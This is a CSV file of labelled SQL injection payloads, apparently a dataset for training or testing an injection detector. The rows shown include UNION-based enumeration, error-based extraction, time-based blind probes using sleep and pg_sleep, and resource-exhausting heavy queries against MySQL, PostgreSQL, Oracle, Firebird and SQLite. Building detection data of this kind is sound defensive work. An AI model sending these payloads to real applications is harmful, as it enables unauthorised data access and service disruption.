row_index,payload_norm,label,sqli_type_hint
6540,"1"" and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",1,
6541,"-1628"" union all select 9189,9189,9189,9189,9189,9189,9189,9189,9189--",1,
6542,"1"" ) as ckoi where 4674 = 4674 union all select null,null,null,null,null,null,null,null,null,null#",1,
6543,"-8166"" ) ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( ""lcqb"" = ""lcqb",1,
6544,"1' in boolean mode ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) #",1,
6545,"-8419 ) where 8692 = 8692 union all select 8692,8692,8692--",1,
6546,1 ) as nmlm where 9872 = 9872,1,
6547,"1"" ) union all select null,null,null,null,null,null,null,null#",1,
6548,-3161' ) or 8501 = 1796,1,
6549,"1'+ ( select 'jhce' where 1117 = 1117 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ) +'",1,
6550,"1"" ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ""lano"" = ""lano",1,
6551,1' and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and 'psdl' like 'psdl,1,
6552,"1"" ) ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( ""oyxk"" = ""oyxk",1,
6553,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 7711 = 7711",1,
6554,"-6600' ) union all select 5566,5566#",1,
6555,1' ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ),1,
6556,"-9721' or elt ( 9511 = 9238,9238 )",1,
6557,"1' ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) )",1,
6558,"1%"" or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #",1,
6559,"select pg_sleep ( 5 ) and ""ilyw"" like ""ilyw",1,
6560,-2820' ) ) or 6679 = 8848--,1,
6561,"-6453"" ) ) as hehs where 9363 = 9363 union all select 9363,9363,9363,9363,9363,9363,9363,9363,9363#",1,
6562,"1"" and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ""zwov"" = ""zwov",1,
6563,1' ) ) as oyad where 7161 = 7161 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,1,
6564,"1 ) ) as kgit where 1919 = 1919 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,
6565,1 ) ) as mcyh where 1001 = 1001,1,
6566,"1' or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and 'usnh' like 'usnh",1,
6567,"1%"" ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""%"" = """,1,
6568,"-5207 ) where 6987 = 6987 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",1,
6569,"-1287"" ) as bbzg where 1475 = 1475 union all select 1475,1475,1475,1475,1475,1475,1475,1475,1475#",1,
